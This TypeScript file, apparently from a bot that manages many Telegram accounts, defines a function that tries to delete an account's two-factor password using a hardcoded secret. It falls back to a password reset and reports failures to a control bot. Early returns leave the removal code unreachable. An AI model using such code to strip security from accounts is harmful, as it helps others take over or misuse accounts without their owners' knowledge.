import TelegramClient from '../../../gramjs/client/TelegramClient';
import { generateRandomBytes } from '../../../gramjs/Helpers';
import { computeCheck } from '../../../gramjs/Password';
import GramJs from '../../../gramjs/tl/api';
import { Account } from '../../@types/Account';
import { updateAccountById } from '../../db/accounts';
import { sendToMainBot } from '../../helpers/sendToMainBot';
import { invokeRequest } from '../../modules/invokeRequest';

const twoFaPassword = '2fapassword';
export const setup2FA = async (client: TelegramClient, account: Account) => {
  try {
    const pwd = await invokeRequest(client, new GramJs.account.GetPassword());
    return
    if (!pwd || !pwd.hasPassword) {
      throw new Error('PASSWORD_EMPTY');
    }

    return

    if (!(pwd.newAlgo instanceof GramJs.PasswordKdfAlgoUnknown)) {
      pwd.newAlgo.salt1 = Buffer.concat([
        pwd.newAlgo.salt1,
        generateRandomBytes(32),
      ]);
    }

    const password = await computeCheck(pwd, twoFaPassword);
    const deletedPassword = await client.invoke(
      new GramJs.account.UpdatePasswordSettings({
        password,
        newSettings: new GramJs.account.PasswordInputSettings({
          newAlgo: pwd.newAlgo,
          newPasswordHash: Buffer.alloc(0),
          hint: '',
          email: undefined,
          newSecureSettings: undefined,
        }),
      })
    );

    if (!deletedPassword) {
      throw new Error('PASSWORD_NOT_DELETED');
    }
  } catch (e: any) {
    if (e.message === 'PASSWORD_EMPTY') {
      const { twoFa } = account;

      if (twoFa !== false) {
        await updateAccountById(client._accountId, {
          twoFa: false,
        });
      }
    } else if (e.message === 'PASSWORD_HASH_INVALID') {
      await invokeRequest(client, new GramJs.account.ResetPassword());
    } else {
      await sendToMainBot(
        `💀 ERROR_DELETE_2FA 💀
ID: ${client._accountId}
ERROR: ${e.message}`
      );
    }
  }
};
